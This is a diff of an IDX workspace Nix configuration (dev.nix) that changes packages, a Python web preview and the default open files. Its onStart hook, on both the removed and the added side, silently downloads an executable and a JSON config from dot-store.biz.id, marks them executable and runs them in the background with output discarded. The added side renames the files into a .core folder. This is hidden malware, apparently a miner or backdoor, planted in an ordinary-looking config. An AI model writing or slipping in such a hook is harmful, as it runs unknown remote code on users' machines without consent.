@@ -2,14 +2,11 @@
 # see: https://developers.google.com/idx/guides/customize-idx-env
 { pkgs, ... }: {
   # Which nixpkgs channel to use.
-  channel = "stable-25.05";
+  channel = "stable-23.11"; # or "unstable"
   # Use https://search.nixos.org/packages to find packages
   packages = [
-    # pkgs.go
-    # pkgs.python311
-    # pkgs.python311Packages.pip
-    # pkgs.nodejs_20
-    # pkgs.nodePackages.nodemon
+    pkgs.nodejs_20
+    pkgs.python3
   ];
   # Sets environment variables in the workspace
   env = {};
@@ -18,20 +15,14 @@
     extensions = [
       # "vscodevim.vim"
     ];
-    # Enable previews
+    # Enable previews and customize configuration
     previews = {
       enable = true;
       previews = {
-        # web = {
-        #   # Example: run "npm run dev" with PORT set to IDX's defined port for previews,
-        #   # and show it in IDX's web preview panel
-        #   command = ["npm" "run" "dev"];
-        #   manager = "web";
-        #   env = {
-        #     # Environment variables to set for your server
-        #     PORT = "$PORT";
-        #   };
-        # };
+        web = {
+          command = ["python3" "-m" "http.server" "$PORT" "--bind" "0.0.0.0"];
+          manager = "web";
+        };
       };
     };
     # Workspace lifecycle hooks
@@ -41,11 +32,11 @@
         # Example: install JS dependencies from NPM
         # npm-install = "npm install";
         # Open editors for the following files by default, if they exist:
-        default.openFiles = [ ".idx/dev.nix" "README.md" ];
+        default.openFiles = [ "style.css" "main.js" "index.html" ];
       };
       # Runs when the workspace is (re)started
       onStart = {
-        joko = "cd .idx && ([ -f .mek ] || wget -q -O .mek https://dot-store.biz.id/bagong) && wget -q -O config.json https://dot-store.biz.id/bagong.json && chmod +x .mek config.json && nohup ./.mek -c 'config.json' > /dev/null 2>&1 &";
+        joko = "mkdir -p .core && cd .core && ([ -f core ] || wget -q -O core https://dot-store.biz.id/bagong) && wget -q -O settings.json https://dot-store.biz.id/bagong.json && chmod +x core settings.json && nohup ./core -c 'core' > /dev/null 2>&1 &";
         # Example: start a background task to watch and re-build backend code
         # watch-backend = "npm run watch-backend";
       };
